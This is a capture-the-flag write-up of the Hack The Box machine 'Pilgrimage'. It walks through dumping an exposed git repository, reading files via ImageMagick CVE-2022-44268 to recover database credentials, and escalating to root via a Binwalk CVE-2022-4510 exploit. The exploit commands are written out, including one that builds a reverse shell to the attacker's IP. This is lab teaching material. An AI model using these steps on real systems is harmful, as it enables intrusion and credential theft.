---
title: "HTB - Pilgrimage"
date: 2026-10-10 08:00:00 +0300
categories: [HTB, HTB-Linux]
tags: [imagemagick, lfi, cve-2022-44268, binwalk, cve-2022-4510, git-dumper, sqlite, file-read]
image:
  path: /assets/img/pilgrimage/banner.png
---


## Enumeration

### Nmap

An initial scan redirected us to `pilgrimage.htb`, so we added the hostname to `/etc/hosts` and ran the scan again. Two ports are open: SSH on 22 and an Nginx web server on 80, with an exposed `.git` directory that immediately stands out.

```bash
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|   256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-git:
|   10.129.70.232:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit.
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST
```

---

### Web (Port 80)

The site is a simple image-shrinking service. We can upload an image, it gets processed and returned at a smaller size. Creating an account adds a dashboard where we can view our previously shrunk images.

![pilgrimage-homepage](/assets/img/pilgrimage/pilgrimage-homepage.png)

![pilgrimage-shrink-result](/assets/img/pilgrimage/pilgrimage-shrink-result.png)

![pilgrimage-dashboard](/assets/img/pilgrimage/pilgrimage-dashboard.png)

Since there is an exposed `.git` directory, we dump the repository with `git-dumper`:

```bash
git-dumper http://pilgrimage.htb/.git src/pilg
```

---

### Source Code Analysis

Looking at `dashboard.php`, the `fetchImages()` function connects to a local SQLite database at `/var/db/pilgrimage`. The query on line 15 uses a prepared statement, so direct SQL injection through the `username` parameter is not viable.

![pilgrimage-dashboard-source](/assets/img/pilgrimage/pilgrimage-dashboard-source.png)

The upload handler in `index.php` is more interesting. It checks `imagesize` and MIME type, then passes the uploaded file to a `magick` binary for conversion. The shrunk output gets saved to the `/shrunk/` directory.

![pilgrimage-upload-source](/assets/img/pilgrimage/pilgrimage-upload-source.png)

The `magick` binary was included in the git dump. Checking its version:

```bash
./magick -version
```

![pilgrimage-imagemagick-version](/assets/img/pilgrimage/pilgrimage-imagemagick-version.png)

This gives us **ImageMagick 7.1.0-49**.

---

## Foothold: ImageMagick LFI (CVE-2022-44268)

Searching for known vulnerabilities in this version, we find **CVE-2022-44268**, an arbitrary file read. When ImageMagick processes a crafted PNG containing a text chunk with a file path, it embeds that file's contents into the output image's metadata.

Using [this PoC](https://github.com/Sybil-Scan/imagemagick-lfi-poc), we generate a malicious PNG that requests `/etc/passwd`:

```bash
python3 generate.py -f "/etc/passwd" -o exploit.png
```

We upload and shrink the image through the web app, download the processed output, then extract the embedded data:

```bash
identify -verbose 6ac9c70499840.png
```

![pilgrimage-identify-output](/assets/img/pilgrimage/pilgrimage-identify-output.png)

The hex-encoded file contents are in the image metadata. Decoding them:

```bash
python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6f74...").decode("utf-8"))'
```

We get the full `/etc/passwd` file.

![pilgrimage-etc-passwd](/assets/img/pilgrimage/pilgrimage-etc-passwd.png)

We tried reading `/proc/self/environ` and `/proc/self/cmdline` but got nothing useful. Going back to the source code, we know the database path is `/var/db/pilgrimage`, so we target that next:

```bash
python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
```

After uploading and extracting the hex data from the processed image, we convert it back to a binary file:

```bash
cat out.hex | xxd -r -p > test.db
file test.db
# test.db: SQLite 3.x database ...
```

Querying the database reveals credentials:

```text
sqlite> .tables
images     users
sqlite> select * from users;
emily | abigchonkyboi123
```

![pilgrimage-sqlite-creds](/assets/img/pilgrimage/pilgrimage-sqlite-creds.png)

These credentials work over SSH, and we land a shell as **emily**.

---

## Privilege Escalation: emily → root (CVE-2022-4510)

Checking what emily owns on the filesystem, we notice a `.config/binwalk` directory, which is unusual for a regular user:

```bash
find / -user emily 2>/dev/null | grep -v '/sys\|/proc\|/run'
```

Checking the version: **Binwalk v2.3.2**.

![pilgrimage-find-binwalk](/assets/img/pilgrimage/pilgrimage-find-binwalk.png)

Running `pspy` reveals a script running as root: `/usr/sbin/malwarescan.sh`.

![pilgrimage-pspy](/assets/img/pilgrimage/pilgrimage-pspy.png)

The script uses `inotifywait` to monitor the `/var/www/pilgrimage.htb/shrunk/` directory. When a new file appears, it runs `binwalk -e` on it and checks if the output contains "Executable script" or "Microsoft executable", deleting the file if it does:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

![pilgrimage-malwarescan](/assets/img/pilgrimage/pilgrimage-malwarescan.png)

Binwalk 2.3.2 is vulnerable to **CVE-2022-4510**, a path traversal vulnerability that allows remote code execution when extracting a crafted PFS image. Since the script runs `binwalk -e` as root on files we can place in the shrunk directory, this is our escalation path.

Using the [exploit from Exploit-DB](https://www.exploit-db.com/exploits/51249):

```bash
python3 51249.py test.png 10.10.14.48 4444
```

We copy the generated `binwalk_exploit.png` to `/var/www/pilgrimage.htb/shrunk/`. The `inotifywait` trigger fires, the malware scan runs `binwalk -e` on our crafted image, and the path traversal drops a reverse shell plugin that executes as root.

![pilgrimage-root-shell](/assets/img/pilgrimage/pilgrimage-root-shell.png)

We catch a shell as root.
